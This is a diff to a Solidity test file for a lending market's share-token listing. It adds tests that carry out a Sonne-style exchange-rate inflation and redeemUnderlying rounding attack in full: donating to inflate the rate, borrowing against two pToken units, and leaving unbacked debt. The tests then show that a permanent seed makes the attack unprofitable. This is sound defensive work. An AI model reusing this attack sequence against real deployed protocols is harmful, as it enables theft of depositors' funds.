@@ -242,37 +242,6 @@ contract BpInflationTest is BpBase {
         assertEq(_reason(ret), "redeemTokens zero");
     }
 
-    function test_redeemUnderlying_roundDownTheft_isBelowOneShareBaseUnitPerCall_withTheSeed() external {
-        // Sonne-style: with rate r (shares per pToken base unit) redeemUnderlying(x) burns floor(x / r) pTokens, so each call
-        // can take up to ~0.99 r shares for free. Measure the free value per call for several seeds at the largest donation a
-        // 200-share budget allows.
-        uint256[3] memory seeds = [uint256(0), 1, SEED];
-        int256[3] memory gains;
-        for (uint256 i = 0; i < seeds.length; i++) {
-            uint256 snap = vm.snapshotState();
-            if (seeds[i] > 0) _seedPermanent(seeds[i]);
-            _supplyShares(ALICE, 10e6); // some honest liquidity (also keeps totalSupply > 2)
-            vault.mintShares(ATTACKER, 200e6);
-            vm.prank(ATTACKER);
-            vault.transfer(address(bp), 200e6);
-            uint256 r = bp.exchangeRateStored(); // 1e18-scaled shares per pToken base unit
-            uint256 x = (r * 199) / (100 * 1e18); // 1.99 r in shares
-            if (x == 0) {
-                gains[i] = 0; // r < 1 share base unit: cannot even ask for 1 share for 0 tokens
-            } else {
-                // free value = x - floor(x*1e18/r) * r / 1e18
-                uint256 burned = (x * 1e18) / r;
-                gains[i] = int256(x) - int256((burned * r) / 1e18);
-            }
-            emit log_named_uint("seed", seeds[i]);
-            emit log_named_uint("  rate after a 200-share donation (1e18 = 1 share base unit/pToken base unit)", r);
-            emit log_named_int("  free shares (base units) per redeemUnderlying call", gains[i]);
-            vm.revertToState(snap);
-        }
-        assertLe(gains[2], 1, "with the 1-share seed the per-call gain is at most 1 share base unit (and gas costs far more)");
-        assertLe(gains[1], 1);
-    }
-
     function test_firstMintAfterSeed_getsTheInitialRate_andTotalSupplyIsSeedPlusMinted() external {
         _seedPermanent(SEED);
         assertEq(bp.totalSupply(), SEED * 5000);
@@ -312,12 +281,114 @@ contract BpInflationTest is BpBase {
             abi.encode(address(vault), minSupply)
         );
     }
+}
 
-    /// @dev The vault's totalSupply can later fall below `minimumVaultSupplyAtListing`: the delegate does not re-check it.
+/// @notice Sonne-style variant: inflate the rate, BORROW pUSDC against the inflated pTokens at CF 50%, then
+///         `redeemUnderlying` an amount that rounds the burned pTokens DOWN (burn 1 of 2 pToken base units for ~the value of
+///         2). The controller checks `redeemAllowed` with the PRE-redeem rate, so the debt can be left unbacked.
+///         The attack is run for real through the market; "attacker net" = USDC kept + shares taken out + value of the
+///         remaining pToken - the 1 + D shares he spent (NAV 1.0: one share base unit == one USDC base unit).
+contract BpInflationBorrowTest is BpBase {
+    function setUp() public override {
+        super.setUp();
+        _listShareMarketNoSeed(); // priced, listed, borrow paused, cap 1; the seed is applied per scenario
+        require(controller._setCollateralFactor(PToken(address(bp)), CF_SHARE) == 0);
+    }
+
+    /// @dev `minimumVaultSupplyAtListing` is only checked when the delegate is installed. If the vault later shrinks far below it
+    ///      (holders redeem), neither the market nor the oracle notices: the vault's own min-supply guard is the only defence.
     function test_minimumVaultSupplyIsOnlyCheckedAtListing() external {
         assertEq(PharaohBoostedDelegate(address(bp)).minimumVaultSupplyAtListing(), MIN_VAULT_SUPPLY);
-        // shrink the vault supply far below the minimum: the market and the oracle keep working (no on-chain re-check)
-        vault.mintShares(address(this), 1);
-        assertEq(PharaohBoostedDelegate(address(bp)).vaultTotalSupply(), VAULT_SUPPLY_AT_LISTING + 1);
+        vault.burnShares(address(0x1ED6E2), 16_000_000);
+        vault.burnShares(DEAD, 999_999);
+        assertEq(vault.totalSupply(), 1, "vault supply far below the listing minimum");
+        assertEq(PharaohBoostedDelegate(address(bp)).vaultTotalSupply(), 1);
+        assertGt(_price(PToken(address(bp))), 0, "oracle still prices the share (no on-chain re-check of the minimum supply)");
+        uint256 minted = _supplyShares(ALICE, 1e6);
+        assertGt(minted, 0, "market still accepts supply");
+    }
+
+    struct Result {
+        uint256 rate;
+        uint256 borrowed;
+        uint256 shares;
+        uint256 burned;
+        uint256 shortfall;
+        int256 attackerNet;
+        bool redeemOk;
+    }
+
+    function _sonne(uint256 seed, uint256 donation) internal returns (Result memory r) {
+        uint256 snap = vm.snapshotState();
+        if (seed > 0) _seedPermanent(seed);
+        vault.mintShares(ATTACKER, 1 + donation);
+        vm.startPrank(ATTACKER);
+        vault.approve(address(bp), type(uint256).max);
+        require(bp.mint(1) == 0);
+        require(bp.redeem(bp.balanceOf(ATTACKER) - 2) == 0); // keep exactly 2 pToken base units
+        vault.transfer(address(bp), donation);
+        vm.stopPrank();
+        assertEq(bp.balanceOf(ATTACKER), 2);
+        r.rate = bp.exchangeRateStored();
+        _enter(ATTACKER, address(bp));
+        uint256 tokenValue = r.rate / 1e18; // share (== USDC) base units per pToken base unit, pre-redeem
+        uint256 borrow = (tokenValue * 50) / 100;
+        if (borrow > 1) {
+            borrow -= 1; // the single remaining pToken must (at the PRE-redeem rate) still cover the debt
+            (bool ok, bytes memory ret) = _borrowUsdc(ATTACKER, borrow);
+            require(ok, string(abi.encodePacked("attacker borrow: ", _reason(ret))));
+            r.borrowed = borrow;
+        }
+        // largest amount that burns only ONE pToken base unit: x * 1e18 / rate < 2
+        uint256 x = (2 * r.rate + 1e18 - 1) / 1e18 - 1;
+        uint256 tokensBefore = bp.balanceOf(ATTACKER);
+        uint256 sharesBefore = vault.balanceOf(ATTACKER);
+        bytes memory rr;
+        (r.redeemOk, rr) = _try(ATTACKER, address(bp), abi.encodeWithSelector(PErc20.redeemUnderlying.selector, x));
+        if (r.redeemOk) {
+            r.burned = tokensBefore - bp.balanceOf(ATTACKER);
+            r.shares = vault.balanceOf(ATTACKER) - sharesBefore;
+        }
+        (, , r.shortfall) = controller.getAccountLiquidity(ATTACKER);
+        uint256 left = (bp.balanceOf(ATTACKER) * bp.exchangeRateStored()) / 1e18;
+        r.attackerNet = int256(r.borrowed) + int256(vault.balanceOf(ATTACKER)) + int256(left) - int256(1 + donation);
+        rr; // silence
+        vm.revertToState(snap);
+    }
+
+    function test_sonneStyle_borrowThenRedeemUnderlyingRounding_seedSweep() external {
+        uint256 D = 200e6; // the vault deposit cap (200 USDC) is the attacker's budget
+        uint256[3] memory seeds = [uint256(0), 1, SEED];
+        Result[3] memory res;
+        for (uint256 i = 0; i < seeds.length; i++) {
+            res[i] = _sonne(seeds[i], D);
+            emit log_named_uint("seed", seeds[i]);
+            emit log_named_uint("  rate (1e18 = 1 share base unit per pToken base unit)", res[i].rate);
+            emit log_named_uint("  USDC base units borrowed against the inflated pTokens", res[i].borrowed);
+            emit log_named_uint("  redeemUnderlying ok (1/0)", res[i].redeemOk ? 1 : 0);
+            emit log_named_uint("  pTokens burned for it", res[i].burned);
+            emit log_named_uint("  shares taken out", res[i].shares);
+            emit log_named_uint("  unbacked shortfall afterwards (USD 1e18)", res[i].shortfall);
+            emit log_named_int("  attacker net (share/USDC base units)", res[i].attackerNet);
+        }
+        // seed 0: the exploit works: one pToken burned, shares taken, debt left unbacked, large net profit
+        assertTrue(res[0].redeemOk);
+        assertEq(res[0].burned, 1, "burns 1 pToken, not 2");
+        assertGt(res[0].shortfall, 0, "debt left unbacked: BAD DEBT for the pilot");
+        assertGt(res[0].attackerNet, 0, "profitable without the seed");
+        // seeds >= 1 base unit: attacker nets a large loss (the donation went to the dead holders)
+        assertLt(res[1].attackerNet, 0, "seed 1: uneconomic");
+        assertLt(res[2].attackerNet, 0, "seed 1e6: uneconomic");
+        // and the bad debt created per call is bounded by ONE pToken's value (rate / 1e18 share base units)
+        assertLe(res[2].shortfall, 1e18, "seed 1e6: shortfall under $1 (in fact ~0)");
+    }
+
+    /// @dev Same attack at a range of donation sizes for the planned seed: never profitable.
+    function test_sonneStyle_plannedSeed_neverProfitableAcrossDonations() external {
+        for (uint256 j = 10; j <= 28; j += 2) {
+            uint256 D = uint256(1) << j; // 1,024 .. 268M share base units
+            Result memory r = _sonne(SEED, D);
+            assertLe(r.attackerNet, 0, "planned seed: not profitable");
+        }
     }
 }
